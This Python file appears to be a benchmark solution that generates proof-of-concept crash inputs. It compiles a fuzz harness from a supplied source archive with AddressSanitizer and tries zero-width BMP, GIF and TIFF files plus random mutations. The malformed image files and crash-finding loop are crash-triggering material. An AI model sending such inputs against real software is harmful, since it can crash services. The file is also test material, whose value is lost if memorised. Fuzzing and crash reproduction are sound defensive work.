import os
import sys
import struct
import tarfile
import subprocess
import shutil
import tempfile
import random

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        Strategy: Extract source, attempt to compile the fuzz target with ASAN,
        and fuzz it with crafted inputs targeting zero width/height vulnerabilities.
        Fallback to static generation if compilation fails.
        """
        temp_dir = tempfile.mkdtemp()
        try:
            # 1. Extract source
            with tarfile.open(src_path) as tar:
                tar.extractall(temp_dir)
            
            # 2. Identify the fuzz target (look for LLVMFuzzerTestOneInput)
            fuzzer_file = None
            possible_files = []
            for root, _, files in os.walk(temp_dir):
                for f in files:
                    if f.endswith(('.c', '.cc', '.cpp', '.cxx')):
                        path = os.path.join(root, f)
                        possible_files.append(path)

            for path in possible_files:
                try:
                    with open(path, 'r', errors='ignore') as fp:
                        if "LLVMFuzzerTestOneInput" in fp.read():
                            fuzzer_file = path
                            break
                except:
                    continue

            # If no fuzzer found, guess based on file names
            if not fuzzer_file:
                return self.generate_fallback(temp_dir)

            # 3. Compile the target
            binary_path = os.path.join(temp_dir, "fuzz_bin")
            compiled = self.compile_target(fuzzer_file, temp_dir, binary_path)

            if not compiled:
                return self.generate_fallback(temp_dir)

            # 4. Fuzz the target
            result = self.fuzz(binary_path)
            if result:
                return result
            
            # If fuzzing didn't crash, return a likely candidate
            return self.generate_fallback(temp_dir)

        except Exception:
            return b""
        finally:
            shutil.rmtree(temp_dir, ignore_errors=True)

    def compile_target(self, fuzzer_file, root_dir, output_bin):
        # Create a main wrapper to run the fuzzer function
        wrapper_code = r"""
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

#ifdef __cplusplus
extern "C" int LLVMFuzzerTestOneInput(const uint8_t *Data, size_t Size);
#else
int LLVMFuzzerTestOneInput(const uint8_t *Data, size_t Size);
#endif

int main(int argc, char **argv) {
    if (argc < 2) return 0;
    FILE *f = fopen(argv[1], "rb");
    if (!f) return 0;
    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    fseek(f, 0, SEEK_SET);
    uint8_t *buf = (uint8_t*)malloc(sz);
    if (!buf) { fclose(f); return 0; }
    fread(buf, 1, sz, f);
    fclose(f);
    LLVMFuzzerTestOneInput(buf, sz);
    free(buf);
    return 0;
}
"""
        src_dir = os.path.dirname(fuzzer_file)
        is_cpp = fuzzer_file.endswith(('.cc', '.cpp', '.cxx'))
        wrapper_path = os.path.join(src_dir, "main_wrapper.cpp" if is_cpp else "main_wrapper.c")
        
        with open(wrapper_path, 'w') as f:
            f.write(wrapper_code)

        # Select compiler
        compiler = 'clang++' if is_cpp else 'clang'
        if shutil.which(compiler) is None:
             compiler = 'g++' if is_cpp else 'gcc'

        # Gather sources (simple heuristic: all sources in the same dir)
        sources = [os.path.join(src_dir, x) for x in os.listdir(src_dir) 
                   if x.endswith(('.c', '.cc', '.cpp')) 
                   and x != os.path.basename(wrapper_path)
                   and "test" not in x.lower()]

        # Include paths
        includes = [f"-I{root_dir}", f"-I{src_dir}"]
        for r, d, _ in os.walk(root_dir):
            if 'include' in d:
                includes.append(f"-I{os.path.join(r, 'include')}")
        
        # Flags for ASAN
        flags = ["-O1", "-g", "-fsanitize=address"]
        
        # Attempt 1: Just fuzzer file and wrapper
        cmd = [compiler] + flags + [fuzzer_file, wrapper_path] + includes + ["-o", output_bin]
        try:
            subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return True
        except:
            # Attempt 2: All sources in dir
            try:
                cmd = [compiler] + flags + sources + [wrapper_path] + includes + ["-o", output_bin]
                subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                return True
            except:
                return False

    def fuzz(self, binary_path):
        seeds = self.get_crafted_zero_inputs()
        valid_seeds = self.get_seeds()
        
        corpus_dir = os.path.dirname(binary_path)
        input_path = os.path.join(corpus_dir, "input.dat")

        # Check crafted seeds (likely to trigger the specific vulnerability)
        for seed in seeds:
            with open(input_path, "wb") as f:
                f.write(seed)
            if self.run_bin(binary_path, input_path):
                return seed

        # Mutate valid seeds
        pool = seeds + valid_seeds
        for _ in range(200):
            base = random.choice(pool)
            mutated = self.mutate(base)
            with open(input_path, "wb") as f:
                f.write(mutated)
            if self.run_bin(binary_path, input_path):
                return mutated
        return None

    def run_bin(self, binary, input_file):
        try:
            subprocess.run([binary, input_file], check=True, 
                           stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, timeout=1)
            return False
        except subprocess.CalledProcessError as e:
            # Crash detected if ASAN report or non-zero exit
            if b"AddressSanitizer" in e.stderr or e.returncode != 0:
                return True
            return False
        except subprocess.TimeoutExpired:
            return False

    def mutate(self, data):
        arr = bytearray(data)
        if not arr: return b""
        idx = random.randint(0, len(arr)-1)
        op = random.randint(0, 3)
        if op == 0: arr[idx] ^= random.randint(1, 255)
        elif op == 1: arr[idx] = random.randint(0, 255)
        elif op == 2: 
            if idx < len(arr)-1: struct.pack_into('<H', arr, idx, 0) # Inject 0
        elif op == 3:
             if idx < len(arr)-1: struct.pack_into('<H', arr, idx, 0xFFFF) # Inject Max
        return bytes(arr)

    def get_seeds(self):
        # BMP
        bmp = bytearray(b'BM' + b'\x00'*52)
        struct.pack_into('<I', bmp, 2, 54)
        struct.pack_into('<I', bmp, 10, 54)
        struct.pack_into('<I', bmp, 14, 40)
        struct.pack_into('<I', bmp, 18, 1) # W=1
        struct.pack_into('<I', bmp, 22, 1) # H=1
        struct.pack_into('<H', bmp, 26, 1)
        struct.pack_into('<H', bmp, 28, 24)
        
        # GIF
        gif = b'GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff!,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;'
        
        # TIFF
        tiff = bytearray(b'II\x2a\x00\x08\x00\x00\x00')
        tiff += struct.pack('<H', 2)
        tiff += struct.pack('<HHII', 256, 3, 1, 1)
        tiff += struct.pack('<HHII', 257, 3, 1, 1)
        tiff += b'\x00\x00\x00\x00'
        
        return [bmp, gif, tiff]

    def get_crafted_zero_inputs(self):
        res = []
        # BMP 0 width
        b = bytearray(b'BM' + b'\x00'*52)
        struct.pack_into('<I', b, 2, 54)
        struct.pack_into('<I', b, 10, 54)
        struct.pack_into('<I', b, 14, 40)
        struct.pack_into('<I', b, 18, 0)
        struct.pack_into('<I', b, 22, 1)
        struct.pack_into('<H', b, 26, 1)
        struct.pack_into('<H', b, 28, 24)
        res.append(bytes(b))

        # GIF 0 width
        g = bytearray(b'GIF89a\x00\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff!,\x00\x00\x00\x00\x00\x00\x01\x00\x00\x02\x02D\x01\x00;')
        res.append(bytes(g))

        # TIFF 0 width
        t = bytearray(b'II\x2a\x00\x08\x00\x00\x00')
        t += struct.pack('<H', 2)
        t += struct.pack('<HHII', 256, 3, 1, 0) # W=0
        t += struct.pack('<HHII', 257, 3, 1, 1)
        t += b'\x00\x00\x00\x00'
        res.append(bytes(t))
        
        return res

    def generate_fallback(self, work_dir):
        # Heuristic guess based on filenames
        names = []
        for r, _, fs in os.walk(work_dir):
            names.extend([f.lower() for f in fs])
        text = " ".join(names)
        
        if "tiff" in text:
            # TIFF 0 width
            t = bytearray(b'II\x2a\x00\x08\x00\x00\x00')
            t += struct.pack('<H', 2)
            t += struct.pack('<HHII', 256, 3, 1, 0)
            t += struct.pack('<HHII', 257, 3, 1, 1)
            t += b'\x00\x00\x00\x00'
            return bytes(t)
        elif "gif" in text:
             g = bytearray(b'GIF89a\x00\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff!,\x00\x00\x00\x00\x00\x00\x01\x00\x00\x02\x02D\x01\x00;')
             return bytes(g)
        else:
            # Default to BMP 0 width as it's common
            b = bytearray(b'BM' + b'\x00'*52)
            struct.pack_into('<I', b, 2, 54)
            struct.pack_into('<I', b, 10, 54)
            struct.pack_into('<I', b, 14, 40)
            struct.pack_into('<I', b, 18, 0)
            struct.pack_into('<I', b, 22, 1)
            struct.pack_into('<H', b, 26, 1)
            struct.pack_into('<H', b, 28, 24)
            return bytes(b)